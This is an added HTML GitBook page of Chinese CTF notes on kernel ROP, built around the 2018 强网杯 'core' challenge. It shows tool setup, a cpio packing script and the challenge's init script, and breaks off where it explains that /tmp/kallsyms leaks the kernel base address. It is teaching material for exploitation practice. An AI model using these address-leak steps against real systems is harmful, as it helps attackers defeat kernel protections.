@@ -1,0 +1,1698 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>kernel_pwn_rop · Gitbook电子书</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="TTY">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../linux_kernel保护机制/linux_kernel保护机制.html" />
+    
+    
+    <link rel="prev" href="../c文件操作/c文件操作.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../pwn/">
+            
+                <a href="../../pwn/">
+            
+                    
+                    pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../pwn/pwn基础/">
+            
+                <a href="../../pwn/pwn基础/">
+            
+                    
+                    pwn基础
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../pwn/pwn基础/gdb使用/gdb使用.html">
+            
+                <a href="../../pwn/pwn基础/gdb使用/gdb使用.html">
+            
+                    
+                    gdb使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../pwn/pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                <a href="../../pwn/pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                    
+                    glibc更换_patchelf方法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../pwn/pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                <a href="../../pwn/pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                    
+                    linux系统调用号查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../../pwn/pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                <a href="../../pwn/pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                    
+                    pwn题编译时的保护选项
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../pwn/">
+            
+                <a href="../../pwn/">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../pwn/fmt/fmt/fmt.html">
+            
+                <a href="../../pwn/fmt/fmt/fmt.html">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="../../pwn/fmt/fmtstr模块/fmtstr模块.html">
+            
+                <a href="../../pwn/fmt/fmtstr模块/fmtstr模块.html">
+            
+                    
+                    fmtstr模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="../../pwn/fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                <a href="../../pwn/fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                    
+                    格式化字符串中的占位符特殊用法
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../pwn/rop/">
+            
+                <a href="../../pwn/rop/">
+            
+                    
+                    rop
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../pwn/rop/ret2csu/ret2csu.html">
+            
+                <a href="../../pwn/rop/ret2csu/ret2csu.html">
+            
+                    
+                    ret2csu
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../../pwn/rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                <a href="../../pwn/rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                    
+                    通过mmap&mprotect来绕过nx
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../../pwn/rop/srop/srop.html">
+            
+                <a href="../../pwn/rop/srop/srop.html">
+            
+                    
+                    srop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../../pwn/rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                <a href="../../pwn/rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                    
+                    dl_runtime_resolve
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.5" data-path="../../pwn/rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                <a href="../../pwn/rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                    
+                    dl_runtime_resolve_64位
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.6" data-path="../../pwn/rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                <a href="../../pwn/rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                    
+                    Ret2dlresolvePayload使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../../pwn/heap_related/">
+            
+                <a href="../../pwn/heap_related/">
+            
+                    
+                    heap_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../pwn/heap_related/house_of_botcake/house_of_botcake.html">
+            
+                <a href="../../pwn/heap_related/house_of_botcake/house_of_botcake.html">
+            
+                    
+                    house_of_botcake
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../../pwn/heap_related/House_of_Einherjar/House_of_Einherjar.html">
+            
+                <a href="../../pwn/heap_related/House_of_Einherjar/House_of_Einherjar.html">
+            
+                    
+                    House_of_Einherjar
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../../pwn/heap_related/House_Of_Force/House_Of_Force.html">
+            
+                <a href="../../pwn/heap_related/House_Of_Force/House_Of_Force.html">
+            
+                    
+                    House_Of_Force
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../../pwn/heap_related/House_of_lore/House_of_lore.html">
+            
+                <a href="../../pwn/heap_related/House_of_lore/House_of_lore.html">
+            
+                    
+                    House_of_lore
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../../pwn/heap_related/House_of_Orange/House_of_Orange.html">
+            
+                <a href="../../pwn/heap_related/House_of_Orange/House_of_Orange.html">
+            
+                    
+                    House_of_Orange
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.6" data-path="../../pwn/heap_related/House_of_storm/House_of_storm.html">
+            
+                <a href="../../pwn/heap_related/House_of_storm/House_of_storm.html">
+            
+                    
+                    House_of_storm
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.7" data-path="../../pwn/heap_related/how2heap学习/how2heap解析.html">
+            
+                <a href="../../pwn/heap_related/how2heap学习/how2heap解析.html">
+            
+                    
+                    how2heap解析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.8" data-path="../../pwn/heap_related/large_bin_attack/large_bin_attack.html">
+            
+                <a href="../../pwn/heap_related/large_bin_attack/large_bin_attack.html">
+            
+                    
+                    large_bin_attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.9" data-path="../../pwn/heap_related/ptmalloc_check/ptmalloc_check.html">
+            
+                <a href="../../pwn/heap_related/ptmalloc_check/ptmalloc_check.html">
+            
+                    
+                    ptmalloc_check
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.10" data-path="../../pwn/heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                <a href="../../pwn/heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                    
+                    unlink攻击敏感指针
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.11" data-path="../../pwn/heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                <a href="../../pwn/heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                    
+                    unsorted_bin相关攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.12" data-path="../../pwn/heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                <a href="../../pwn/heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                    
+                    IO_2_1_stdout泄露内存
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../../pwn/FILE_related/">
+            
+                <a href="../../pwn/FILE_related/">
+            
+                    
+                    FILE_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../pwn/FILE_related/close_free/fog.html">
+            
+                <a href="../../pwn/FILE_related/close_free/fog.html">
+            
+                    
+                    fog
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../pwn/FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                <a href="../../pwn/FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                    
+                    FILE攻击的一些进阶操作_待补充
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../pwn/FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                <a href="../../pwn/FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                    
+                    FILE结构体概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../pwn/FILE_related/FSOP/FSOP.html">
+            
+                <a href="../../pwn/FILE_related/FSOP/FSOP.html">
+            
+                    
+                    FSOP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../pwn/FILE_related/vtable伪造/vtable伪造.html">
+            
+                <a href="../../pwn/FILE_related/vtable伪造/vtable伪造.html">
+            
+                    
+                    vtable伪造
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../../pwn/沙箱/">
+            
+                <a href="../../pwn/沙箱/">
+            
+                    
+                    沙箱
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../../pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                <a href="../../pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.27下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../../pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                <a href="../../pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.29下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../../pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                <a href="../../pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.31下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../../pwn/沙箱/seccomp&ptcl/seccomp&ptcl.html">
+            
+                <a href="../../pwn/沙箱/seccomp&ptcl/seccomp&ptcl.html">
+            
+                    
+                    seccomp&ptcl
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../arm_pwn/">
+            
+                <a href="../../arm_pwn/">
+            
+                    
+                    arm_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                <a href="../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                    
+                    arm&aarch64汇编
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                <a href="../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                    
+                    ARMpwn基础环境搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                <a href="../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                    
+                    树莓派搭建ARM环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    kernel_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../c文件操作/c文件操作.html">
+            
+                <a href="../c文件操作/c文件操作.html">
+            
+                    
+                    c文件操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.2" data-path="kernel_pwn_rop.html">
+            
+                <a href="kernel_pwn_rop.html">
+            
+                    
+                    kernel_pwn_rop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                <a href="../linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                    
+                    linux_kernel保护机制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../linux_kernel基础/linux_kernel基础.html">
+            
+                <a href="../linux_kernel基础/linux_kernel基础.html">
+            
+                    
+                    linux_kernel基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../ropper简单使用/ropper简单使用.html">
+            
+                <a href="../ropper简单使用/ropper简单使用.html">
+            
+                    
+                    ropper简单使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../awd/">
+            
+                <a href="../../awd/">
+            
+                    
+                    awd
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
+            
+                <a href="../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
+            
+                    
+                    awdpwn流量转发手动
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                <a href="../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                    
+                    evilPatcher_pwn通防
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                <a href="../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                    
+                    如何在awd中苟活_pwn
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../IOT漏洞挖掘/">
+            
+                <a href="../../IOT漏洞挖掘/">
+            
+                    
+                    IOT漏洞挖掘
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                    
+                    IoT-vulhub学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1.1" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                    
+                    Cisco-CVE-2020-3331
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.2" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                    
+                    HUAWEI-CVE-2017-17215
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.3" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                    
+                    Netgear-CVE-2019-20760
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.4" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                    
+                    Tenda-CVE-2018-16333
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.5" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                    
+                    Tenda-CVE-2018-5767
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.6" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                    
+                    Tenda-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.7" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                    
+                    TP-Link-CVE-2020-8423
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.8" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                    
+                    VIVOTEK-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../密码学/">
+            
+                <a href="../../密码学/">
+            
+                    
+                    密码学
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../密码学/AES/AES.html">
+            
+                <a href="../../密码学/AES/AES.html">
+            
+                    
+                    AES
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../../密码学/RC4/RC4.html">
+            
+                <a href="../../密码学/RC4/RC4.html">
+            
+                    
+                    RC4
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../../web/">
+            
+                <a href="../../web/">
+            
+                    
+                    web
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../../web/sql注入/sql注入.html">
+            
+                <a href="../../web/sql注入/sql注入.html">
+            
+                    
+                    sql注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../../机器学习/">
+            
+                <a href="../../机器学习/">
+            
+                    
+                    机器学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../../机器学习/pytorch/pytorch.html">
+            
+                <a href="../../机器学习/pytorch/pytorch.html">
+            
+                    
+                    pytorch
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../../机器学习/数据处理/数据处理.html">
+            
+                <a href="../../机器学习/数据处理/数据处理.html">
+            
+                    
+                    数据处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >kernel_pwn_rop</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h4 id="&#x73AF;&#x5883;&#x642D;&#x5EFA;&#x5DE5;&#x5177;">&#x73AF;&#x5883;&#x642D;&#x5EFA;&amp;&#x5DE5;&#x5177;</h4>
+<ul>
+<li><p>qemu</p>
+<p>qemu &#x662F;&#x4E00;&#x6B3E;&#x7531; Fabrice Bellard&#x7B49;&#x4EBA;&#x7F16;&#x5199;&#x7684;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x786C;&#x4EF6;&#x865A;&#x62DF;&#x5316;&#x7684;&#x5F00;&#x6E90;&#x6258;&#x7BA1;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x5177;&#x6709;&#x8FD0;&#x884C;&#x901F;&#x5EA6;&#x5FEB;&#xFF08;&#x914D;&#x5408; kvm&#xFF09;&#xFF0C;&#x8DE8;&#x5E73;&#x53F0;&#x7B49;&#x4F18;&#x70B9;&#x3002; </p>
+</li>
+<li><p>gdb&amp;pwndbg</p>
+</li>
+<li>ropper</li>
+<li>extract-vmlinux &amp; vmlinux-to-elf&#xFF08;&#x6211;&#x8FD8;&#x4E0D;&#x4F1A;&#x7528;&#x3002;&#x3002;&#x5C1D;&#x8BD5;&#x4E86;&#x51E0;&#x6B21;&#x7B26;&#x53F7;&#x8868;&#x52A0;&#x8F7D;&#x8FDB;gdb&#x7684;&#x65F6;&#x5019;&#x5931;&#x8D25;&#x4E86;&#xFF0C;&#x4E0D;&#x8FC7;&#x5F71;&#x54CD;&#x4E5F;&#x4E0D;&#x5927;&#xFF0C;&#x611F;&#x89C9;&#x524D;&#x671F;&#x4E0D;&#x7528;&#x4E5F;&#x6CA1;&#x4E8B;&#xFF09;</li>
+</ul>
+<p><a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a></p>
+<p><a href="https://github.com/marin-m/vmlinux-to-elf" target="_blank">https://github.com/marin-m/vmlinux-to-elf</a> </p>
+<h4 id="&#x9898;&#x76EE;&#x9644;&#x4EF6;&#x5F62;&#x5F0F;">&#x9898;&#x76EE;&#x9644;&#x4EF6;&#x5F62;&#x5F0F;</h4>
+<ol>
+<li>boot.sh: &#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x542F;&#x52A8; kernel &#x7684; shell &#x7684;&#x811A;&#x672C;&#xFF0C;&#x591A;&#x7528; qemu&#xFF0C;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;&#x4E0E; qemu &#x4E0D;&#x540C;&#x7684;&#x542F;&#x52A8;&#x53C2;&#x6570;&#x6709;&#x5173;</li>
+<li>bzImage: kernel binary</li>
+<li>rootfs.cpio: &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6620;&#x50CF;(&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E0B;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x89E3;&#x538B;&#x3002;&#x3002;)</li>
+</ol>
+<p><img src="1.png" alt=""></p>
+<p>&#x9898;&#x76EE;&#xFF1A;kernel ROP - 2018 &#x5F3A;&#x7F51;&#x676F; - core</p>
+<p>&#x5BF9;&#x4E8E;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7531;&#x4E8E;&#x8FD0;&#x884C;qemu&#x65F6;&#x8FD8;&#x8981;&#x6253;&#x5305;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x5E38;&#x5199;&#x4E2A;&#x538B;&#x7F29;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x653E;&#x5728;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x3002;</p>
+<p>pack.sh</p>
+<pre><code class="lang-shell">#!/bin/sh
+find . | cpio -o --format=newc &gt; ../core.cpio
+</code></pre>
+<p>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0B;&#x7684;init&#x521D;&#x59CB;&#x5316;&#x811A;&#x672C;</p>
+<pre><code class="lang-shell">#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs none /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+cat /proc/kallsyms &gt; /tmp/kallsyms
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+ifconfig eth0 up
+udhcpc -i eth0
+ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2 
+insmod /core.ko
+
+poweroff -d 1200000 -f &amp;
+setsid /bin/cttyhack setuidgid 1000 /bin/sh
+echo &apos;sh end!\n&apos;
+umount /proc
+umount /sys
+
+poweroff -d 0  -f
+</code></pre>
+<p>&#x76F8;&#x5BF9;&#x91CD;&#x8981;&#x7684;&#x51E0;&#x884C;</p>
+<p>1.</p>
+<pre><code class="lang-shell">cat /proc/kallsyms &gt; /tmp/kallsyms
+</code></pre>
+<p>&#x5728;&#x666E;&#x901A;&#x7528;&#x6237;&#x4E0B;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;/tmp/kallsyms&#x6765;&#x67E5;&#x770B;&#x5185;&#x6838;&#x7684;&#x51FD;&#x6570;&#x6A21;&#x5757;&#xFF0C;&#x53EF;&#x4EE5;&#x6CC4;&#x9732;&#x5185;&#x6838;&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;</p>
